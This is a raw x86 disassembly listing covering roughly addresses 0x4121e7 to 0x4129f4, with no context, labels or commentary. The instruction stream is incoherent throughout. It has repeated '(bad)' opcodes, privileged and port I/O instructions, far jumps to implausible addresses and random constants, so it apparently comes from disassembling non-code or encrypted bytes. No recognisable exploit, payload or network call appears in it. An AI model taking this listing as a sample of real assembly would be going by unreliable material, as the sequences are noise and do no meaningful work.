  4121e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121e8:	adc    DWORD PTR [edi+0x2edaa454],edi
  4121ee:	jmp    0x41217c
  4121f0:	or     DWORD PTR [ebx+ebp*8],0x2
  4121f4:	push   ds
  4121f5:	cmp    DWORD PTR [edx],ebp
  4121f7:	xor    al,0xce
  4121f9:	add    ebx,DWORD PTR [ebx-0x1b]
  4121fc:	lods   al,BYTE PTR ds:[esi]
  4121fd:	cmp    BYTE PTR [eax],dh
  4121ff:	push   ds
  412200:	adc    bh,BYTE PTR [ebp+0x35ac3014]
  412206:	pop    ds
  412207:	dec    eax
  412208:	popf   
  412209:	(bad)  
  41220a:	sub    eax,0xebe21025
  41220f:	iret   
  412210:	jno    0x412276
  412212:	ss xor al,0xd3
  412215:	in     eax,0x2b
  412217:	daa    
  412218:	outs   dx,DWORD PTR ds:[esi]
  412219:	es pop edi
  41221b:	mov    ch,0xa8
  41221d:	xchg   edi,eax
  41221e:	clc    
  41221f:	pop    edi
  412220:	jns    0x41223a
  412222:	jmp    0x41225d
  412224:	sub    dh,BYTE PTR [eax]
  412226:	or     BYTE PTR [esi],bh
  412228:	push   ebx
  412229:	jle    0x4121e9
  41222b:	add    ah,BYTE PTR ds:0x2ad58cf5
  412231:	cmp    edx,DWORD PTR [eax-0x15]
  412234:	int    0x5f
  412236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412237:	stc    
  412238:	sbb    ecx,ebx
  41223a:	or     eax,0xd1c570cb
  41223f:	pop    es
  412240:	xchg   BYTE PTR [ebp-0x37],ch
  412243:	mov    edi,0xec78cd5c
  412248:	push   0x1b24290f
  41224d:	pop    ebx
  41224e:	jns    0x412206
  412250:	sbb    al,0x62
  412252:	jnp    0x4122b5
  412254:	jl     0x41223f
  412256:	cmp    bh,BYTE PTR [ebx+eiz*2+0x71]
  41225a:	ret    
  41225b:	lods   al,BYTE PTR ds:[esi]
  41225c:	jge    0x412264
  41225e:	nop
  41225f:	fdivr  DWORD PTR [edx+0x68]
  412262:	inc    edi
  412263:	adc    BYTE PTR [ebp-0x34cc204d],0x26
  41226a:	lock jg 0x412211
  41226d:	out    dx,al
  41226e:	pop    edi
  41226f:	sub    al,bl
  412271:	xor    DWORD PTR [esi+eax*1+0x12cb2674],0x119eb678
  41227c:	iret   
  41227d:	mov    ds:0xf953c83c,al
  412282:	xchg   dh,dl
  412284:	add    al,0xfe
  412286:	sub    ch,BYTE PTR [eax]
  412288:	aas    
  412289:	inc    ebp
  41228a:	or     BYTE PTR [ecx+0x37],al
  41228d:	xor    DWORD PTR [eax+0x5],0xe0bf1779
  412294:	adc    eax,0x29f3d6a6
  412299:	sub    al,0x42
  41229b:	mov    ebx,0xb7c94c61
  4122a0:	sbb    BYTE PTR [ebx+0x31],0xe4
  4122a4:	nop
  4122a5:	imul   edx,DWORD PTR [ebp-0x76],0xcc11f81a
  4122ac:	mov    bl,0x95
  4122ae:	test   DWORD PTR [edx],edx
  4122b0:	cmp    eax,0xbb8622d1
  4122b5:	fwait
  4122b6:	pop    ebp
  4122b7:	cmp    al,0xf
  4122b9:	mov    WORD PTR [eax-0x50],es
  4122bc:	scas   eax,DWORD PTR es:[edi]
  4122bd:	test   al,0xfb
  4122bf:	pop    ds
  4122c0:	mov    esp,0xd212e74f
  4122c5:	fs imul eax,ecx,0xffffffb9
  4122c9:	xchg   DWORD PTR [ecx],edx
  4122cb:	pop    ds
  4122cc:	mov    BYTE PTR [esi+0x6bca8b63],al
  4122d2:	enter  0x3238,0x1e
  4122d6:	pop    esi
  4122d7:	ror    BYTE PTR [edx+0x1a379875],1
  4122dd:	lahf   
  4122de:	dec    ebx
  4122df:	mov    eax,0x8933017e
  4122e4:	or     al,BYTE PTR [esi]
  4122e6:	jecxz  0x41231c
  4122e8:	enter  0xaec,0xbb
  4122ec:	retf   0x9a3c
  4122ef:	xor    BYTE PTR [ebx],0x5f
  4122f2:	ret    0x5e08
  4122f5:	sub    al,0x2d
  4122f7:	imul   ecx,DWORD PTR [ebp-0x4f],0xd4020b7b
  4122fe:	mov    al,0xbd
  412300:	scas   al,BYTE PTR es:[edi]
  412301:	xor    DWORD PTR [ecx-0x64d64964],0xa000f5a5
  41230b:	jnp    0x412301
  41230d:	add    al,BYTE PTR [ecx]
  41230f:	ror    edx,0x5
  412312:	xchg   ebx,eax
  412313:	(bad)  
  412314:	or     eax,0x8f227cb
  412319:	jge    0x4122e3
  41231b:	adc    BYTE PTR [ecx],0xb7
  41231e:	xor    BYTE PTR [esi],dh
  412320:	or     cl,BYTE PTR [edx]
  412322:	fiadd  WORD PTR ds:[ebx]
  412325:	shr    DWORD PTR [esi],1
  412327:	pop    eax
  412328:	jnp    0x41231d
  41232a:	mov    edx,DWORD PTR [edi-0xc]
  41232d:	mov    esi,edx
  41232f:	add    al,BYTE PTR ds:0xf2864a53
  412335:	pop    es
  412336:	psadbw mm6,QWORD PTR [edi-0x5a]
  41233a:	dec    eax
  41233b:	jp     0x4122eb
  41233d:	(bad)  
  41233e:	jl     0x412333
  412340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412341:	add    eax,0x6ad97bf0
  412346:	lds    edi,FWORD PTR [eax+0x4c6ca661]
  41234c:	out    dx,eax
  41234d:	adc    eax,0x4dff44eb
  412352:	or     eax,0x2ddcc377
  412357:	inc    esp
  412358:	fsub   DWORD PTR [ecx+esi*4+0x53]
  41235c:	cs scas eax,DWORD PTR es:[edi]
  41235e:	and    eax,0x59951f91
  412363:	test   eax,0x1a75fcc
  412368:	mov    al,0xfc
  41236a:	adc    edx,DWORD PTR [edi]
  41236c:	dec    ecx
  41236d:	shl    BYTE PTR [eax+0x5710d78f],cl
  412373:	sbb    DWORD PTR ds:0xc2ee064d,edx
  412379:	pop    esi
  41237a:	sub    BYTE PTR [esi+0x7cf6fbad],dh
  412380:	mov    ds:0x15c2631f,eax
  412385:	dec    ecx
  412386:	xor    BYTE PTR [ecx+esi*4],bh
  412389:	into   
  41238a:	xor    BYTE PTR ss:[esi+0x504c6abc],0xb2
  412392:	inc    ecx
  412393:	jmp    0x9b60198
  412398:	pop    edx
  412399:	bound  ecx,QWORD PTR [ecx-0x7f880b47]
  41239f:	mov    edi,0x45ffa33f
  4123a4:	pop    ds
  4123a5:	pop    ecx
  4123a6:	(bad)  [edi-0x18]
  4123a9:	inc    ecx
  4123aa:	mov    al,ds:0xe00dbcaa
  4123af:	fs mov fs,esi
  4123b2:	dec    edi
  4123b3:	push   edi
  4123b4:	jo     0x4123f6
  4123b6:	loope  0x4123f2
  4123b8:	cmc    
  4123b9:	clc    
  4123ba:	cmp    BYTE PTR [ebx+0x70139799],ch
  4123c0:	xchg   sp,ax
  4123c2:	fwait
  4123c3:	and    BYTE PTR [edi+0x2118010e],dl
  4123c9:	inc    esp
  4123ca:	inc    DWORD PTR [edx-0x24457d1f]
  4123d0:	out    dx,al
  4123d1:	sub    esi,DWORD PTR gs:0x9524f42c
  4123d8:	or     dl,dl
  4123da:	mov    bl,0x9a
  4123dc:	cmp    bh,BYTE PTR [ecx-0x10]
  4123df:	mov    edi,0x2a95861e
  4123e4:	outs   dx,DWORD PTR ds:[esi]
  4123e5:	mov    eax,0x7e8a34bb
  4123ea:	stos   BYTE PTR es:[edi],al
  4123eb:	stos   BYTE PTR es:[edi],al
  4123ec:	mov    ch,0xe2
  4123ee:	lods   al,BYTE PTR ds:[esi]
  4123ef:	fistp  QWORD PTR [ecx+0x73]
  4123f2:	or     eax,0xcd30941f
  4123f7:	mov    BYTE PTR [edi],ah
  4123f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123fa:	sub    eax,0x36148314
  4123ff:	push   0xb0514b03
  412404:	ficomp WORD PTR [ebp-0x3807d39f]
  41240a:	xor    DWORD PTR [edi],ebp
  41240c:	mov    ds:0x7b0eef21,al
  412411:	jge    0x4123bb
  412413:	and    dh,BYTE PTR [ebp-0x225474fb]
  412419:	sub    eax,0x8c186c85
  41241e:	iret   
  41241f:	pop    ss
  412420:	in     al,0x26
  412422:	ficomp WORD PTR [ebx+0x723fcb71]
  412428:	lahf   
  412429:	scas   eax,DWORD PTR es:[edi]
  41242a:	adc    eax,0xff1293cc
  41242f:	cs into 
  412431:	xor    BYTE PTR [ebx-0x6d],al
  412434:	repz cvtpd2dq xmm1,XMMWORD PTR [esi+eiz*1-0x75]
  41243b:	(bad)  
  41243c:	push   esp
  41243d:	in     eax,0x41
  41243f:	dec    ebx
  412440:	fwait
  412441:	pushf  
  412442:	jno    0x41240e
  412444:	popa   
  412445:	mov    eax,0x8f388735
  41244a:	jns    0x4123d5
  41244c:	inc    ebp
  41244d:	lahf   
  41244e:	push   edi
  41244f:	xlat   BYTE PTR ds:[ebx]
  412450:	int3   
  412451:	or     al,0x1c
  412453:	sub    BYTE PTR [ecx+0x51],0xdd
  412457:	push   edx
  412458:	sti    
  412459:	test   eax,0x793a1dfe
  41245e:	push   ecx
  41245f:	popa   
  412460:	push   ebx
  412461:	jo     0x4124de
  412463:	arpl   WORD PTR [ecx+0x5f2d8ebe],si
  412469:	inc    ebx
  41246a:	ins    BYTE PTR es:[edi],dx
  41246b:	arpl   WORD PTR [edx-0x186945ff],cx
  412471:	les    edx,FWORD PTR [edi]
  412473:	rol    BYTE PTR [edi+edx*8],1
  412476:	out    dx,al
  412477:	imul   edx,ecx,0xb
  41247a:	ret    0x21c9
  41247d:	pop    esi
  41247e:	mov    ebp,0xbc6d05d6
  412483:	rcl    DWORD PTR [esi],1
  412485:	add    ah,dl
  412487:	dec    esi
  412488:	sub    dh,al
  41248a:	mov    ds,WORD PTR [esi+0x5f]
  41248d:	popf   
  41248e:	ds sbb eax,0x42c05b19
  412494:	unpckhps xmm6,XMMWORD PTR [ecx+0x5856ce92]
  41249b:	hlt    
  41249c:	sbb    cl,BYTE PTR [edi-0xe1b2c91]
  4124a2:	xor    eax,0xb65d08d2
  4124a7:	pop    eax
  4124a8:	clc    
  4124a9:	ret    
  4124aa:	test   BYTE PTR [esi+0xc4e1033],0xd
  4124b1:	out    dx,eax
  4124b2:	popa   
  4124b3:	enter  0x5c2b,0xef
  4124b7:	ins    DWORD PTR es:[edi],dx
  4124b8:	sub    DWORD PTR [ecx+0x71d16c02],esp
  4124be:	xor    al,0x18
  4124c0:	inc    ecx
  4124c1:	cld    
  4124c2:	jb     0x412484
  4124c4:	sahf   
  4124c5:	inc    esi
  4124c6:	bound  esi,QWORD PTR [ebx+0x5d0dfc19]
  4124cc:	cmp    DWORD PTR [esi],eax
  4124ce:	jmp    0x4124a7
  4124d0:	loop   0x412481
  4124d2:	jp     0x4124d8
  4124d4:	sub    al,al
  4124d6:	xor    BYTE PTR [edx],cl
  4124d8:	scas   eax,DWORD PTR es:[edi]
  4124d9:	xchg   esi,eax
  4124da:	push   edi
  4124db:	ret    
  4124dc:	enter  0xbe60,0x46
  4124e0:	mov    edx,0x7f37b822
  4124e5:	iretw  
  4124e7:	or     al,0xb9
  4124e9:	and    DWORD PTR [esi-0x7d],ebx
  4124ec:	ins    DWORD PTR es:[edi],dx
  4124ed:	sti    
  4124ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124ef:	int3   
  4124f0:	push   ecx
  4124f1:	mov    cl,BYTE PTR [esp+ebx*8]
  4124f4:	sub    BYTE PTR [esi],ah
  4124f6:	jae    0x412503
  4124f8:	call   0xcff14b4f
  4124fd:	retf   0x49a0
  412500:	(bad)  
  412502:	pop    ecx
  412503:	and    al,bh
  412505:	pop    edx
  412506:	les    ecx,FWORD PTR [eax-0x12b5cd17]
  41250c:	in     al,dx
  41250d:	push   0x922e5efd
  412512:	gs leave 
  412514:	sbb    ax,WORD PTR [edx]
  412517:	mov    edx,0xe3d29925
  41251c:	xor    ah,dl
  41251e:	mov    ch,0xbd
  412520:	and    ch,BYTE PTR [ebx]
  412522:	ins    DWORD PTR es:[edi],dx
  412523:	test   BYTE PTR [ebp-0x73],bl
  412526:	push   ss
  412527:	xchg   edi,eax
  412528:	dec    esi
  412529:	jmp    0xfeb8da80
  41252e:	mov    esi,0x1e13459
  412533:	dec    ebp
  412534:	neg    BYTE PTR [edi+0x13]
  412537:	into   
  412538:	test   BYTE PTR [ebx],ch
  41253a:	xlat   BYTE PTR ds:[ebx]
  41253b:	xor    eax,0xd7e6c833
  412540:	leave  
  412541:	(bad)  
  412542:	jp     0x4124c5
  412544:	cli    
  412545:	mov    cl,0x45
  412547:	cmp    al,BYTE PTR [edx+0x68]
  41254a:	ss pop esp
  41254c:	mov    esi,0xa8c6dc6f
  412551:	es ret 
  412553:	loope  0x412584
  412555:	push   ss
  412556:	mov    dh,0x54
  412558:	cmp    edx,DWORD PTR [ebp+0x64d0f42a]
  41255e:	cs xchg ebp,eax
  412560:	iret   
  412561:	xchg   DWORD PTR [esp+edx*4],edx
  412564:	cdq    
  412565:	mov    esi,?
  412567:	sub    al,0x99
  412569:	mov    BYTE PTR [esi+0x6cb84302],cl
  41256f:	dec    esi
  412570:	jns    0x41254e
  412572:	aaa    
  412573:	mov    ecx,0x2619df84
  412578:	stos   BYTE PTR es:[edi],al
  412579:	int3   
  41257a:	mov    ch,0x95
  41257c:	(bad)  
  41257d:	jnp    0x412545
  41257f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412580:	inc    ebp
  412581:	pop    ss
  412582:	aaa    
  412583:	pop    eax
  412584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412585:	sbb    ebx,DWORD PTR [ebx-0x7a05d216]
  41258b:	pop    ds
  41258c:	jecxz  0x412574
  41258e:	cmp    esp,ebp
  412590:	add    eax,0xa5e6f275
  412595:	enter  0xc002,0x70
  412599:	sbb    esi,edx
  41259b:	xchg   esi,eax
  41259c:	sbb    DWORD PTR [esi+0x2c],ebp
  41259f:	cmp    DWORD PTR [eax+0x38],0xfffffff7
  4125a3:	stos   BYTE PTR es:[edi],al
  4125a4:	or     al,0xae
  4125a6:	int    0x7c
  4125a8:	(bad)  
  4125a9:	std    
  4125aa:	mov    ah,BYTE PTR [edi-0x49]
  4125ad:	cmp    bh,BYTE PTR [ebp-0x4b]
  4125b0:	sub    eax,0x8d0280b3
  4125b5:	ins    BYTE PTR es:[edi],dx
  4125b6:	lahf   
  4125b7:	in     al,dx
  4125b8:	mov    eax,0x4ac57010
  4125bd:	xlat   BYTE PTR ds:[ebx]
  4125be:	dec    esp
  4125bf:	dec    edi
  4125c0:	dec    esp
  4125c1:	mov    ebx,0x8affb82a
  4125c6:	xor    eax,0x266f9c6d
  4125cb:	hlt    
  4125cc:	out    0x31,al
  4125ce:	mov    ebx,0xdf98f405
  4125d3:	cmp    eax,eax
  4125d5:	fcom   QWORD PTR [ecx]
  4125d7:	add    DWORD PTR [esi+0x39],esp
  4125da:	sub    eax,0xb34e402e
  4125df:	xchg   DWORD PTR [ecx+0x6a],esp
  4125e2:	jmp    0x7695:0x8ac34a1f
  4125e9:	mov    BYTE PTR [edx+0x6b],ch
  4125ec:	popa   
  4125ed:	mov    edi,0xa3f1c015
  4125f2:	lahf   
  4125f3:	xor    ah,BYTE PTR [eax+0x4afe0ca7]
  4125f9:	sbb    DWORD PTR [ebx+eiz*1-0x1dddb259],esp
  412600:	xor    DWORD PTR [ebx-0x6579aada],ecx
  412606:	test   al,0x4e
  412608:	fst    st(4)
  41260a:	icebp  
  41260b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41260c:	cmp    eax,0x68f8dbd1
  412611:	xchg   ebp,eax
  412612:	xchg   ebx,eax
  412613:	mov    ebp,0x4cc7aff7
  412618:	and    BYTE PTR [esp+ebp*1+0x19f3ab5d],0x17
  412620:	xchg   ebx,eax
  412621:	pop    eax
  412622:	push   es
  412623:	retf   
  412624:	and    ebx,esp
  412626:	in     al,dx
  412627:	mov    edi,DWORD PTR [esi+0x3177ca12]
  41262d:	pusha  
  41262e:	xor    ch,BYTE PTR [edi+edx*8]
  412631:	setp   BYTE PTR [edx+0x3e1cb99b]
  412638:	imul   ebp,edi,0x437207f2
  41263e:	fdiv   QWORD PTR [edx]
  412640:	test   al,0x87
  412642:	dec    edi
  412643:	sbb    al,0xdd
  412645:	adc    al,0x6c
  412647:	jno    0x4126a5
  412649:	call   0xae61:0x1ae473c1
  412650:	iret   
  412651:	pop    ecx
  412652:	test   al,0x61
  412654:	sbb    bh,BYTE PTR [ebp-0xb]
  412657:	ins    DWORD PTR es:[edi],dx
  412658:	push   edi
  412659:	xor    al,0x1a
  41265b:	push   ebp
  41265c:	xor    edx,DWORD PTR [ebx-0x26]
  41265f:	int3   
  412660:	mov    ds:0x92beeeee,eax
  412665:	imul   edx,DWORD PTR [esi-0x80],0x8b33d2fd
  41266c:	xchg   ebx,eax
  41266d:	repnz sahf 
  41266f:	xchg   esi,eax
  412670:	int3   
  412671:	(bad)  
  412672:	int3   
  412673:	test   eax,0xb1413838
  412678:	mov    ds:0x9513ef5e,eax
  41267d:	stc    
  41267e:	push   eax
  41267f:	cld    
  412680:	xchg   esi,eax
  412681:	jno    0x4126d8
  412683:	dec    esi
  412684:	dec    ebp
  412685:	xor    bl,BYTE PTR [ebx]
  412687:	or     BYTE PTR [ecx],dl
  412689:	in     eax,0x8
  41268b:	mov    bh,0x23
  41268d:	and    BYTE PTR [ecx-0x6c],al
  412690:	daa    
  412691:	leave  
  412692:	add    ecx,DWORD PTR [edi+eax*1+0x6d]
  412696:	mov    esi,0x98f5d9d8
  41269b:	pop    ebp
  41269c:	xchg   ebp,eax
  41269d:	adc    BYTE PTR [ecx-0x52],ah
  4126a0:	stc    
  4126a1:	call   0x75744cf
  4126a6:	scas   eax,DWORD PTR es:[edi]
  4126a7:	xor    DWORD PTR [ebx+ebp*1],ebp
  4126aa:	push   ds
  4126ab:	and    ebp,DWORD PTR [esi+0x40]
  4126ae:	fnstsw WORD PTR [ebp-0x15d4690]
  4126b4:	pop    ss
  4126b5:	mov    al,0x41
  4126b7:	jle    0x41264a
  4126b9:	push   0x4358a466
  4126be:	imul   ecx,DWORD PTR [esi+0x28],0x47551c09
  4126c5:	dec    esi
  4126c6:	jbe    0x4126b3
  4126c8:	xchg   ecx,eax
  4126c9:	scas   eax,DWORD PTR es:[edi]
  4126ca:	test   DWORD PTR [edi],ecx
  4126cc:	xor    BYTE PTR [ebx+0x45a9886],dh
  4126d2:	sbb    BYTE PTR [edx],dh
  4126d4:	in     al,dx
  4126d5:	call   0x89f30437
  4126da:	jns    0x412717
  4126dc:	fist   DWORD PTR [ebp+0x2fb14a16]
  4126e2:	in     eax,dx
  4126e3:	xor    DWORD PTR [eax+ebp*1],ebp
  4126e6:	dec    edi
  4126e7:	fcom   QWORD PTR [ebp-0x541621ee]
  4126ed:	outs   dx,DWORD PTR ds:[esi]
  4126ee:	stos   DWORD PTR es:[edi],eax
  4126ef:	jae    0x41269a
  4126f1:	mov    cl,0x75
  4126f3:	addr16 (bad) 
  4126f5:	pop    ss
  4126f6:	repz pop esp
  4126f8:	fwait
  4126f9:	mov    WORD PTR [esi-0x3230079f],es
  4126ff:	xchg   edi,eax
  412700:	xor    edi,esp
  412702:	je     0x412710
  412704:	test   al,0xdb
  412706:	sbb    BYTE PTR [edx],0xf0
  412709:	sub    BYTE PTR [edx-0x697883],cl
  41270f:	xchg   al,bh
  412711:	sub    al,BYTE PTR [ebp+0x4f74d595]
  412717:	pop    ebx
  412718:	cli    
  412719:	loopne 0x4126f5
  41271b:	add    BYTE PTR [ebp+0x32],cl
  41271e:	mov    esi,0x3fe461fc
  412724:	add    dh,BYTE PTR [ebp+0x4292b19b]
  41272a:	sub    bh,BYTE PTR [edx+0x6d9c2f7a]
  412730:	(bad)  
  412731:	push   ebx
  412732:	sub    eax,0xcac641d2
  412737:	sub    eax,0x6e079690
  41273c:	stc    
  41273d:	dec    esp
  41273e:	xchg   esp,eax
  41273f:	jg     0x412771
  412741:	int3   
  412742:	rol    DWORD PTR [ebp+0x7e],0x98
  412746:	mov    ds:0x192ccbc9,al
  41274b:	dec    esp
  41274c:	push   cs
  41274d:	stc    
  41274e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41274f:	and    ebx,eax
  412751:	sub    bl,BYTE PTR [edx+0x71999f13]
  412757:	cli    
  412758:	clc    
  412759:	mov    ds:0xc11a1d86,eax
  41275e:	nop
  41275f:	addr16 fucom st(2)
  412762:	imul   eax,DWORD PTR [eax-0x7a],0x55
  412766:	inc    ebx
  412767:	(bad)  
  412769:	push   0xffffff9b
  41276b:	mov    ds:0x402ba921,eax
  412770:	push   esi
  412771:	repz mov ebp,DWORD PTR [esi+0x1a]
  412775:	js     0x412792
  412777:	arpl   WORD PTR [edx-0x31],si
  41277a:	cmc    
  41277b:	cmp    al,0x6d
  41277d:	fxch   st(2)
  41277f:	mov    ds:0xb712953a,eax
  412784:	jbe    0x41270f
  412786:	scas   eax,DWORD PTR es:[edi]
  412787:	adc    BYTE PTR [ecx+0x1b],bh
  41278a:	xor    BYTE PTR [eax],ah
  41278c:	scas   al,BYTE PTR es:[edi]
  41278d:	mov    dh,0x6f
  41278f:	mov    edi,0xb2b42e73
  412794:	pop    ebx
  412795:	or     al,0x4b
  412797:	or     ch,al
  412799:	dec    ebx
  41279a:	test   al,0xf4
  41279c:	not    BYTE PTR [edx+0x2e8c05ac]
  4127a2:	jg     0x412807
  4127a4:	mov    dl,BYTE PTR cs:[ecx+0x18]
  4127a8:	pop    esi
  4127a9:	cdq    
  4127aa:	add    BYTE PTR [edx+0x1d212ba8],dh
  4127b0:	scas   al,BYTE PTR es:[edi]
  4127b1:	stc    
  4127b2:	inc    ecx
  4127b3:	cmc    
  4127b4:	pop    ds
  4127b5:	ins    DWORD PTR es:[edi],dx
  4127b6:	aam    0x7c
  4127b8:	test   al,0xc0
  4127ba:	adc    eax,0x596989ec
  4127bf:	push   ecx
  4127c0:	inc    ecx
  4127c1:	sbb    DWORD PTR [eax],esi
  4127c3:	pop    esi
  4127c4:	and    eax,0x172c676
  4127c9:	and    BYTE PTR [edi],0x4a
  4127cc:	add    dh,BYTE PTR [ebp-0x27f65420]
  4127d2:	ret    
  4127d3:	push   ds
  4127d4:	or     ebx,ebp
  4127d6:	xchg   ebx,eax
  4127d7:	lods   eax,DWORD PTR ds:[esi]
  4127d8:	adc    bh,BYTE PTR [ebx]
  4127da:	lahf   
  4127db:	enter  0x81f2,0x98
  4127df:	push   ebx
  4127e0:	mov    esp,0x7b4cec64
  4127e5:	sub    eax,0x1dcda471
  4127ea:	sub    dh,BYTE PTR [ecx+0x49]
  4127ed:	or     edx,DWORD PTR [ebx+0x54]
  4127f0:	sub    al,0x67
  4127f2:	mov    ebp,0x5ee590d0
  4127f7:	addr16 sub al,0x35
  4127fa:	mov    eax,ds:0xe11581ba
  4127ff:	xor    eax,0x3af48d7d
  412804:	add    BYTE PTR [ebx+0x44193853],al
  41280a:	lods   eax,DWORD PTR ds:[esi]
  41280b:	and    BYTE PTR [esi],al
  41280d:	cli    
  41280e:	jnp    0x412794
  412810:	lock clc 
  412812:	xor    al,0x97
  412814:	loope  0x4127f8
  412816:	adc    eax,esp
  412818:	and    ecx,DWORD PTR [edi+0x4c]
  41281b:	pop    edx
  41281c:	jno    0x4127f6
  41281e:	or     bl,bh
  412820:	push   0xffffffd3
  412822:	retf   0xa4ca
  412825:	pusha  
  412826:	loop   0x4127ce
  412828:	push   ds
  412829:	inc    edi
  41282a:	jo     0x4127bc
  41282c:	fild   DWORD PTR gs:[edi]
  41282f:	pop    eax
  412830:	lods   al,BYTE PTR ds:[esi]
  412831:	or     esp,ebp
  412833:	shl    DWORD PTR [eax+0x12],1
  412836:	jbe    0x41283f
  412838:	mov    esi,ecx
  41283a:	int    0xf6
  41283c:	in     al,dx
  41283d:	pop    edx
  41283e:	out    dx,al
  41283f:	pop    ebp
  412840:	jg     0x4128aa
  412842:	mov    eax,0x37e2d891
  412847:	mov    ch,0x51
  412849:	iret   
  41284a:	idiv   BYTE PTR [ebx-0x72]
  41284d:	mov    edx,0x8dc6a541
  412852:	pop    ds
  412853:	je     0x41287c
  412855:	inc    esp
  412856:	cmc    
  412857:	sub    al,BYTE PTR [ecx+0x7716183e]
  41285d:	mov    BYTE PTR [ebx+0x25c84b15],0x12
  412864:	cld    
  412865:	cmp    ebx,DWORD PTR [ebp+0x3feb2bd1]
  41286b:	lods   al,BYTE PTR ds:[esi]
  41286c:	or     DWORD PTR [ebp-0x74],0xff4d358b
  412873:	shl    DWORD PTR [eax+0x38900bf2],1
  412879:	push   cs
  41287a:	ret    0x69f7
  41287d:	mov    BYTE PTR [eax+0x5269a0bc],cl
  412883:	dec    esp
  412884:	test   eax,0x96e1f8d9
  412889:	sbb    eax,0x77dafff7
  41288e:	imul   edi,ecx,0xffffffa2
  412891:	pushf  
  412892:	ins    DWORD PTR es:[edi],dx
  412893:	add    BYTE PTR [edi+0x6125972f],0xbe
  41289a:	lahf   
  41289b:	mov    eax,0x493e547f
  4128a0:	test   eax,0x79edec7a
  4128a5:	jo     0x412903
  4128a7:	repz scas eax,DWORD PTR es:[edi]
  4128a9:	lahf   
  4128aa:	and    al,0x53
  4128ac:	push   0x4ea243c7
  4128b1:	xchg   edx,eax
  4128b2:	xor    DWORD PTR [edx+0x17c26c36],eax
  4128b8:	sub    BYTE PTR [esi],bl
  4128ba:	sahf   
  4128bb:	add    eax,0x67b7000e
  4128c0:	setge  BYTE PTR [esi]
  4128c3:	in     al,0x5f
  4128c5:	push   0x4e38a2cc
  4128ca:	lds    esp,FWORD PTR [edi-0x61]
  4128cd:	mov    ah,0xd9
  4128cf:	aam    0x9a
  4128d1:	jbe    0x4128c6
  4128d3:	retf   
  4128d4:	shl    BYTE PTR [ebx],1
  4128d6:	mov    esp,0xdd5c5052
  4128db:	mov    ecx,0xd773928d
  4128e0:	adc    BYTE PTR [ebx+0x4885f404],dh
  4128e6:	or     al,0xea
  4128e8:	mov    ebp,DWORD PTR [esi-0x476671e6]
  4128ee:	pop    esp
  4128ef:	xchg   ebx,eax
  4128f0:	aam    0x9d
  4128f2:	imul   edx,DWORD PTR [ecx-0x176840db],0x21175577
  4128fc:	push   ebp
  4128fd:	push   edx
  4128fe:	pusha  
  4128ff:	mov    ah,0xf8
  412901:	mov    ecx,0xf19e625
  412906:	dec    edx
  412907:	xchg   ecx,eax
  412909:	and    BYTE PTR [edi-0x2a],0xb4
  41290d:	push   edi
  41290e:	hlt    
  41290f:	cmp    BYTE PTR [edx+0xcbf9c1c],ah
  412915:	lock mov bl,0x97
  412918:	adc    ebx,ebp
  41291a:	es cs xor eax,0x1b4cce96
  412921:	xchg   esi,eax
  412922:	scas   al,BYTE PTR es:[edi]
  412923:	push   esi
  412924:	add    DWORD PTR [esi-0x55],0xffffff8c
  412928:	dec    ecx
  412929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41292a:	in     al,0x72
  41292c:	inc    ebp
  41292d:	sbb    ch,BYTE PTR [edx-0x3a1d9385]
  412933:	mov    esi,0xaa98a779
  412938:	mov    ds:0x6796a043,al
  41293d:	addr16 mov bl,0xdf
  412940:	or     ch,BYTE PTR [edx+0x2cf87d4d]
  412946:	aad    0x67
  412948:	test   eax,0xf8bd5f54
  41294d:	jo     0x4128e1
  41294f:	pop    esp
  412950:	xor    al,0x2f
  412952:	rol    BYTE PTR [ebp-0x11],0xa1
  412956:	cmp    ecx,DWORD PTR [ecx+0x4d6c9909]
  41295c:	mov    ch,0xdc
  41295e:	jb     0x41290c
  412960:	sti    
  412961:	adc    DWORD PTR [ebp-0x5d0a4af2],edx
  412967:	test   al,0x1
  412969:	mov    fs,ecx
  41296b:	iret   
  41296c:	dec    edi
  41296d:	call   0x50f2:0x4e3a10a8
  412974:	cs pop edx
  412976:	mov    edx,eax
  412978:	and    eax,0xade93531
  41297d:	xchg   esp,eax
  41297e:	sub    DWORD PTR [eax-0x6b626382],esi
  412984:	adc    al,0x3b
  412986:	xor    al,cl
  412988:	xchg   ecx,eax
  412989:	push   0x21f53f25
  41298e:	mov    al,0xcb
  412990:	fdiv   QWORD PTR [eax]
  412992:	add    ecx,DWORD PTR [ebx+ecx*4+0x6a2de99c]
  412999:	js     0x412924
  41299b:	loop   0x41298d
  41299d:	push   edi
  41299e:	lods   al,BYTE PTR ds:[esi]
  41299f:	cli    
  4129a0:	jmp    ecx
  4129a2:	pop    edx
  4129a3:	aam    0xd
  4129a5:	iret   
  4129a6:	add    ah,BYTE PTR [ebx-0x64]
  4129a9:	repnz outs dx,BYTE PTR ds:[esi]
  4129ab:	sbb    eax,0x28a13db4
  4129b0:	xchg   edx,eax
  4129b1:	fldenv [eax]
  4129b3:	imul   edx,edi,0xee402929
  4129b9:	jns    0x4129ed
  4129bb:	scas   al,BYTE PTR es:[edi]
  4129bc:	bnd jb 0x4129ad
  4129bf:	inc    esp
  4129c0:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4129c2:	jl     0x412965
  4129c4:	addr16 xor eax,0x75030610
  4129ca:	imul   ecx,DWORD PTR ds:0xf4d602e0,0x65
  4129d1:	mov    al,ds:0x9474b2c0
  4129d6:	pop    esp
  4129d7:	xchg   edi,eax
  4129d8:	jmp    0x412963
  4129da:	jbe    0x412a20
  4129dc:	sbb    DWORD PTR [ecx+0x37],ecx
  4129df:	dec    edi
  4129e0:	sti    
  4129e1:	mov    esp,0x248b1f03
  4129e6:	pop    eax
  4129e7:	mov    dh,BYTE PTR [edx-0x41]
  4129ea:	push   ebp
  4129eb:	adc    dl,BYTE PTR [esi+ecx*4]
  4129ee:	mov    eax,0xd238bf19
  4129f3:	sahf   
  4129f4:	cmp    edx,ecx
